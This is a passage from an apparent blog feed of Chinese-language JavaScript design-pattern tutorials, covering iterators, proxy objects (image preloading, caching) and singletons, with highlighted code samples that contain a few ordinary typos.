class="keyword">for</span>(<span class="keyword">var</span> i = ary.<span class="property">length</span> - <span class="number">1</span>; l &gt;= <span class="number">0</span>; l--)&#123;</span><br><span class="line">        <span class="title function_">callback</span>(l, ary[l]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">reverseEach</span>([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], <span class="keyword">function</span>(<span class="params">i, n</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n);    <span class="comment">// 2， 1， 0</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="五、中止迭代器"><a href="#五、中止迭代器" class="headerlink" title="五、中止迭代器"></a>五、中止迭代器</h3><p>迭代器可以像普通for循环中的break一样，提供一种跳出循环的方法。</p><p>下面我们把之前的each函数改写一下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> each = <span class="keyword">function</span>(<span class="params">ary, callback</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; l = ary.<span class="property">length</span>; i &lt; l; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">callback</span>(i, ary[i]) === <span class="literal">false</span>)&#123;     <span class="comment">// callback的执行结果返回false，提前终止迭代</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">each</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], <span class="keyword">function</span>(<span class="params">i, n</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &gt; <span class="number">3</span>)&#123;                  <span class="comment">// n大于3的时候终止循环</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n)              <span class="comment">// 1, 2, 3</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h3><p>迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。迭代器模式可以把迭代的过程从业务逻辑中分离出来，在使用迭代器模式之后，即使不关心对象的内部构造，也可以按顺序访</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>代理模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/03/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/03/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-03T02:29:47.000Z</published>
    <updated>2024-09-03T02:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><p>代理模式是为了一个对象提供一个代用品或占位符，以便控制对它的访问</p><p>道理模式的关键是，当客户不方便直接访问一个对象或者不满足需要的时候，提供一个替身对象来控制对这个对象的访问，客户实际上访问的是替身对象。替身对象对请求做出一些处理后，再把请求转交给本体对象。</p><h3 id="一、第一个例子——小明追MM的故事"><a href="#一、第一个例子——小明追MM的故事" class="headerlink" title="一、第一个例子——小明追MM的故事"></a>一、第一个例子——小明追MM的故事</h3><blockquote><p>在四月一个晴朗的早晨，小明遇到了他百分百女孩，我们暂且称呼小明的女神为A。两天过后，小明决定给A送一束花来表白。刚好小明打听到A和他有一个共同的朋友B，于是内向的小明决定让B来代替自己完成送花这件事情。</p></blockquote><p>不用代理模式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Flower</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">sendFlower</span>: <span class="keyword">function</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flower = <span class="keyword">new</span> <span class="title class_">Flower</span>();</span><br><span class="line">        target.<span class="title function_">receiveFlower</span>(flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">    <span class="attr">receiveFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;收到花&#x27;</span> + flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.<span class="title function_">sendFlower</span>(A);</span><br></pre></td></tr></table></figure><p>接下来，我们引入代理B，即小明通过B来给A送花：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Flower</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">sendFlower</span>: <span class="keyword">function</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flower = <span class="keyword">new</span> <span class="title class_">Flower</span>();</span><br><span class="line">        target.<span class="title function_">receivelower</span>(flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">    <span class="attr">receiverFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        A.<span class="title function_">receiveFlower</span>(flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">    <span class="attr">receiveFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;收到花&#x27;</span> + flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.<span class="title function_">sendFlower</span>(B);</span><br></pre></td></tr></table></figure><p>现在我们改变故事的背景设定，假设当A在心情好的时候收到花，小明表白成功的机率有60%，而当A在心情差的时候收到花，小明表白的成功率无限趋近于0.</p><p>小明跟A刚刚认识两天，还无法辨别A什么时候心情好。如果不合时宜地把花送给A，花被直接扔掉的可能性很大。</p><p>但是A的朋友B却很了解A，所以小明只管把花交给B，B会监听A的心情变化，然后选择A心情好的时候把花转交给A：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Flower</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">sendFlower</span>: <span class="keyword">function</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flower = <span class="keyword">new</span> <span class="title class_">Flower</span>();</span><br><span class="line">        target.<span class="title function_">receiveFlower</span>(flower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">    <span class="attr">receiverFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        A.<span class="title function_">listenGoodMood</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;    <span class="comment">// 监听A的好心情</span></span><br><span class="line">            A.<span class="title function_">receiveFlower</span>(flower);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">    <span class="attr">receiverFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;收到花&#x27;</span> + flower);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">listenGoodMood</span>: <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title function_">fn</span>();</span><br><span class="line">        &#125;, <span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.<span class="title function_">sendFlower</span>(B);</span><br></pre></td></tr></table></figure><h3 id="二、保护代理和虚拟代理"><a href="#二、保护代理和虚拟代理" class="headerlink" title="二、保护代理和虚拟代理"></a>二、保护代理和虚拟代理</h3><p>代理B可以帮助A过滤掉一些请求，比如送花的人中年龄太大的或者没有宝马的，这种请求就可以直接在代理B处被拒绝掉。这种代理叫做<strong>保护代理</strong>。A和B一个充当白脸，一个充当黑脸，白脸A继续保持良好的女神形象，不希望直接拒绝任何人，于是找了黑脸B来控制对A的访问。</p><p>假设现实中化的价格不菲，导致在程序世界里，new Flower也是一个代价昂贵的操作，那么我们可以把new Flower的操作交给代理B去执行，代理B会选择在A心情好时再执行new Flower，这是代理的另一种模式，叫做<strong>虚拟代理</strong>。虚拟代理把一些开销很大的对象，延迟到真正需要它的时候才去创建。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">    <span class="attr">receiverFlower</span>: <span class="keyword">function</span>(<span class="params">flower</span>)&#123;</span><br><span class="line">        A.<span class="title function_">listenGoodMood</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;    <span class="comment">// 监听A的好心情</span></span><br><span class="line">            A.<span class="title function_">receiveFlower</span>(flower);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>保护代理用于控制不同权限的对象对目标对象的访问，但在JavaScript并不容易实现保护代理，因为我们无法判断谁访问了某个对象。而虚拟代理是最常用的一种代理模式。</p><h3 id="三、虚拟代理图片预加载"><a href="#三、虚拟代理图片预加载" class="headerlink" title="三、虚拟代理图片预加载"></a>三、虚拟代理图片预加载</h3><p>在web开发中，图片预加载是一种常用的技术，如果直接给某个img标签节点设置src属性，由于图片过大或者网络不佳，图片的位置往往有段时间是空白的。常见的做法是先用一张loading图片占位，然后用异步的方式加载图片，等图片加载好了再把它填充到img节点里，这种场景就很适合使用虚拟代理。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myImage = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> imgNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(imgNode);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">setSrc</span>: <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">            imgNode.<span class="property">src</span> = src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">myImage.<span class="title function_">setSrc</span>(<span class="string">&#x27;http://xxx.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>现在开始引入代理对象proxyImage，通过这个代理对象，在图片被真正加载好之前，页面中将出现一张占位的图，来提示用户图片正在加载。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myImage = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> imgNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(imgNode);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">setSrc</span>: <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">            imgNode.<span class="property">src</span> = src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proxyImage = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>;</span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        myImage.<span class="title function_">setSrc</span>(<span class="variable language_">this</span>.<span class="property">src</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">setSrc</span>: <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">            myImage.<span class="title function_">setSrc</span>(<span class="string">&#x27;file:xxx.gif&#x27;</span>);</span><br><span class="line">            img.<span class="property">src</span> = src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">proxyImage.<span class="title function_">setSrc</span>(<span class="string">&#x27;http://xxx.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="四、代理的意义"><a href="#四、代理的意义" class="headerlink" title="四、代理的意义"></a>四、代理的意义</h3><p>不用代理的预加载图片函数实现如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MyImage</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> imgNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(imgNode);</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>;</span><br><span class="line">    </span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        imgNode.<span class="property">src</span> = img.<span class="property">src</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">setSrc</span>: <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">            imgNode.<span class="property">src</span> = <span class="string">&#x27;file:xxx.gif&#x27;</span>;</span><br><span class="line">            img.<span class="property">src</span> = src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title class_">MyImage</span>.<span class="title function_">setSrc</span>(<span class="string">&#x27;http://xxx.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>为了说明代理的意义，下面我们引人一个面向对象设计的原则——单一职责原则。</p><p>单一职责原则指的是，就一个类(通常也包括对象和丽数等)而言，应该仅有一个引起它变化的原因。如果一个对象承担了多项职责，就意味着这个对象将变得巨大，引起它变化的原因可能会有多个。面向对象设计鼓励将行为分布到细粒度的对象之中,如果一个对象承担的职责过多，等于把这些职责耦合到了一起，这种耦合会导致脆弱和低内聚的设计。当变化发生时，设计可能会遭到意外的破坏。</p><p>职责被定义为“引起变化的原因”。上段代码中的MyImage对象除了负责给img节点设置src外，还要负责预加载图片。我们在处理其中一个职责时，有可能因为其强耦合性影响另外一个职责的实现。</p><p>另外，在面向对象的程序设计中，大多数情况下，若违反其他任何原则，同时将违反开放——封闭原则。如果我们只是从网络上获取一些体积很小的图片，或者5年后的网速快到根本不再需要预加载，我们可能希望把预加载图片的这段代码从MyImage对象里删掉。这时候就不得不改动MyImage对象了。</p><p>实际上，我们需要的只是给img节点设置STC，预加载图片只是一个锦上添花的功能。如果能把这个操作放在另一个对象里面，自然是一个非常好的方法。于是代理的作用在这里就体现出来了，代理负责预加载图片，预加载的操作完成之后，把请求重新交给本体MyImage。</p><h3 id="五、代理和本体接口的一致性"><a href="#五、代理和本体接口的一致性" class="headerlink" title="五、代理和本体接口的一致性"></a>五、代理和本体接口的一致性</h3><p>上一节说到，如果有一天我们不再需要预加载，那么就不再需要代理对象，可以选择直接请求本体。其中关键是代理对象和本体都对外提供了setSrc方法，在客户看来，代理对象和本体是一致的，代理接手请求的过程对于用户来说是透明的，用户并不清楚代理和本体的别，这样做有两个好处。</p><ul><li>用户可以放心地请求代理，他只关心是否能得到想要的结果。</li><li>在任何使用本体的地方都可以替换成使用代理。</li></ul><p>在Java等语言中，代理和本体都需要显式地实现同一个接口，一方面接口保证了它们会拥有同样的方法，另一方面，面向接口编程迎合依赖倒置原则，通过接口进行向上转型，从而避开编译器的类型检查，代理和本体将来可以被替换使用。</p><p>在JavaScrit这种动态类型语言中，我们有时通过鸭子类型来检测代理和本体是否都实现了setSrc方法，另外大多数时候甚至干跪不做检测，全部依赖程序员的自觉性，这对于程序的健壮性是有影响的。不过对于一门快速开发的脚本语言，这些影响还是在可以接受的范围内，而且我们也习惯了没有接口的世界。</p><p>另外值得一提的是，如果代理对象和本体对象都为一个两数(两数也是对象)，两数必然都能被执行，则可以认为它们也具有一致的“接口”。</p><h3 id="六、虚拟代理合并HTTP请求"><a href="#六、虚拟代理合并HTTP请求" class="headerlink" title="六、虚拟代理合并HTTP请求"></a>六、虚拟代理合并HTTP请求</h3><p>先想象这样一个场景：每周我们都要写一份工作周报，周报要交给总监批阅。总监手下管理着150个员工，如果我们每个人直接把周报发给总监，那总监可能要把一整周的时间都花在查看邮件上面。</p><p>现在我们把周报发给各自的组长，组长作为代理，把组内成员的周报合并提炼成一份后一次性地发给总监。这样一来，总监的邮箱便清净多了。</p><p>这个例子在程序世界里很容易引起共鸣，在Web开发中，也许最大的开销就是网络请求。假设我们在做一个文件同步的功能，当我们选中一个checkbox的时候，它对应的文件就会被同步到另外一台备用服务器上面。</p><h3 id="七、缓存代理"><a href="#七、缓存代理" class="headerlink" title="七、缓存代理"></a>七、缓存代理</h3><p>缓存代理可以为一些开销大的运算结果提供暂时的存储，在下次运算时，如果传递进来的参数跟之前一致，则可以直接返回前面存储的运算结果。</p><ol><li><h4 id="缓存代理的例子——计算乘积"><a href="#缓存代理的例子——计算乘积" class="headerlink" title="缓存代理的例子——计算乘积"></a>缓存代理的例子——计算乘积</h4><p>先创建一个用于求乘积的函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mult = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始计算乘积&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; l = <span class="variable language_">arguments</span>.<span class="property">length</span>;i &lt; l; i++)&#123;</span><br><span class="line">        a = a * <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">mult</span>(<span class="number">2</span>,<span class="number">3</span>);   <span class="comment">// 6</span></span><br><span class="line"><span class="title function_">mult</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>); <span class="comment">// 24</span></span><br></pre></td></tr></table></figure><p>现在加入缓存代理函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proxyMult = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> cache = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">join</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>,<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(args <span class="keyword">in</span> cache)&#123;</span><br><span class="line">            <span class="keyword">return</span> cache[args];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cache[args] = mult.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title function_">proxyMult</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);   <span class="comment">// 24</span></span><br><span class="line"><span class="title function_">proxyMult</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);   <span class="comment">// 24</span></span><br></pre></td></tr></table></figure><p>当我们第二次调用proxyMult(1，2，3，4）的时候，本体mult函数并没有被计算，proxyMult直接返回了之前缓存好的计算结果。</p><p>通过增加缓存代理的方式，mult函数可以继续专注于自身的职责——计算乘积，缓存的功能是由代理对象实现的。</p></li><li><h4 id="缓存代理用于ajax异步请求"><a href="#缓存代理用于ajax异步请求" class="headerlink" title="缓存代理用于ajax异步请求"></a>缓存代理用于ajax异步请求</h4><p>我们在常常在项目中遇到分页的需求，同一页的数据理论上只需要去后台拉取一次，这些已经拉取到的数据在某个地方被缓存之后，下次再请求同一页的时候，便可以直接使用之前的数据。</p><p>显然这里也可以引人缓存代理，实现方式跟计算乘积的例子差不多，唯一不同的是，请求数据是个异步的操作，我们无法直接把计算结果放到代理对象的缓存中，而是要通过回调的方式。</p></li></ol><h3 id="八、其他代理模式"><a href="#八、其他代理模式" class="headerlink" title="八、其他代理模式"></a>八、其他代理模式</h3><p>代理模式的变化种类非常多</p><ul><li>防火墙代理：控制网络资源的访问，保护主机不让”坏人”接近。</li><li>远程代理：为一个对象在不同的地址空间提供局部代表，在Java中，远程代理可以是另一个虚拟机中的对象，</li><li>保护代理：用于对象应该有不同访问权限的情况。</li><li>智能引用代理：取代了简单的指针，它在访问对象时执行一些附加操作，比如计算一个对象被引用的次数。</li><li>写时复制代理：通常用于复制一个庞大对象的情况。写时复制代理延迟了复制的过程，当对象被真正修改时，才对它进行复制操作。写时复制代理是虚拟代理的一种变体，DLL（操作系统中的动态链接库）是其典型运用场景。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;代理模式是为了一个对象提供一个代用品或占位符，以便控制对它的访问&lt;/p&gt;
&lt;p&gt;道理模式的关键是，当客户不方便直接访问一个对象或者不满足需要的时候，提供一个替身对象来控制对这个对象的访问，客户实际上访问</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>单例模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/02/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/02/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-02T04:59:47.000Z</published>
    <updated>2024-09-02T05:00:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><p>单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p><h3 id="一、实现单例模式"><a href="#一、实现单例模式" class="headerlink" title="一、实现单例模式"></a>一、实现单例模式</h3><p>用一个变量来标志当前是否已经为某个类创建过对象，如果是，则在下一次获取该类的实例时，直接返回之前创建的对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Singleton</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Singleton</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getName</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Singleton</span>.<span class="property">getInstance</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> instance = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!instance)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="title class_">Singleton</span>.<span class="title function_">getInstance</span>(<span class="string">&#x27;seven1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="title class_">Singleton</span>.<span class="title function_">getInstance</span>(<span class="string">&#x27;seven2&#x27;</span>);</span><br><span class="line"><span class="title function_">alert</span>(a === b);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>通过<code>Singleton.getInstance</code>来获取Singleton类的唯一对象，这种方式相对简单，但有一个问题，就是增加了这个类的”不透明性”，Singleton类的使用者必须知道这是一个单例类，跟以往通过new xxx的方式来获取的对象不同，这里偏要使用<code>Singleton.getInstance</code>来获取对象。</p><h3 id="二、透明的单例模式"><a href="#二、透明的单例模式" class="headerlink" title="二、透明的单例模式"></a>二、透明的单例模式</h3><p>用户从这个类中创建对象的时候，可以像使用其他任何普通类一样。下面，我们将使用CreateDiv单例类，它的作用是负责在页面中创建唯一的div节点。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">CreateDiv</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> instance;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">CreateDiv</span> = <span class="keyword">function</span>(<span class="params">html</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance)&#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">html</span> = html;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">init</span>();</span><br><span class="line">        <span class="keyword">return</span> instance = <span class="variable language_">this</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">CreateDiv</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    div.<span class="property">innerHTML</span> = <span class="variable language_">this</span>.<span class="property">html</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">CreateDiv</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">CreateDiv</span>(<span class="string">&#x27;seven1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">CreateDiv</span>(<span class="string">&#x27;seven2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(a === b);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>为了把instance封装起来，我们使用了自执行的匿名函数和闭包，并且让这个匿名函数返回真正的Singleton构造方法，这增加了一些程序的复杂度，阅读起来也不是很舒服。</p><p>CreateDiv的构造函数实际上负责了两件事情，第一是创建对象和执行初始化init方法，第二是保证只有一个对象。</p><h3 id="三、用代理实现单例模式"><a href="#三、用代理实现单例模式" class="headerlink" title="三、用代理实现单例模式"></a>三、用代理实现单例模式</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title 